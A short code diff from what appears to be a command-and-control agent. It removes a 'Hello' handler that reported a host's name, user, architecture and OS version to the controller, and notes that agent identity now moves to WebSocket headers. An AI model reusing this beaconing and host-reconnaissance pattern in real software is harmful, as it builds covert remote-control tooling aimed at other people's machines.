@@ -91,40 +91,8 @@ static BOOL IsDotEntry(const DirectoryEntry &entry)
 // Command handlers
 // =============================================================================
 
-VOID Handle_HelloCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
-{
-    LOG_INFO("Handling HelloCommand.");
-    // Retrieve system information
-    SystemInfo info;
-    GetSystemInfo(&info);
-
-    // Prepend build metadata header to the response so the C2 can identify the
-    // agent and packet structure before parsing the remaining payload
-    AgentBuildInfo buildInfo;
-    buildInfo.ApiVersion = AGENT_API_VERSION;
-    buildInfo.AgentNameId = AGENT_NAME_ID;
-const CHAR commitHash[] = AGENT_COMMIT_HASH;
-Memory::Zero(buildInfo.CommitHash, sizeof(buildInfo.CommitHash));
-const USIZE commitHashChars = (sizeof(commitHash) - 1 < sizeof(buildInfo.CommitHash) - 1) ? (sizeof(commitHash) - 1) : (sizeof(buildInfo.CommitHash) - 1);
-Memory::Copy(buildInfo.CommitHash, commitHash, commitHashChars);
-    buildInfo.BuildNumber = AGENT_BUILD_NUMBER;
-    buildInfo.Is64Bit = (sizeof(void*) == 8);
-
-    // 64-bit capability mask: bit i set iff category i (CapabilityBit) is supported.
-    CapabilityMask capabilities = BuildCapabilityMask();
-
-    *responseLength = sizeof(UINT32) + sizeof(AgentBuildInfo) + sizeof(SystemInfo) + sizeof(CapabilityMask);
-    *response = new CHAR[*responseLength];
-    *(PUINT32)*response = StatusCode::StatusSuccess;
-
-    // Append build info header, system info, and capability mask to the response buffer
-    Memory::Copy(*response + sizeof(UINT32), &buildInfo, sizeof(AgentBuildInfo));
-    Memory::Copy(*response + sizeof(UINT32) + sizeof(AgentBuildInfo), &info, sizeof(SystemInfo));
-    Memory::Copy(*response + sizeof(UINT32) + sizeof(AgentBuildInfo) + sizeof(SystemInfo), &capabilities, sizeof(CapabilityMask));
-
-    LOG_INFO("Hello: hostname=%s, username=%s, arch=%s, agent_platform=%s, os_version=%s, build=%u, commit=%s, api=%u",
-             info.Hostname, info.Username, info.Architecture, info.AgentPlatform, info.OSVersion, buildInfo.BuildNumber, buildInfo.CommitHash, buildInfo.ApiVersion);
-}
+// NOTE: the Hello command (0x00) is gone — identity travels on the WebSocket
+// upgrade request as X-Agent-* HTTP headers (see main.cc BuildIdentityHeaders).
 
 VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
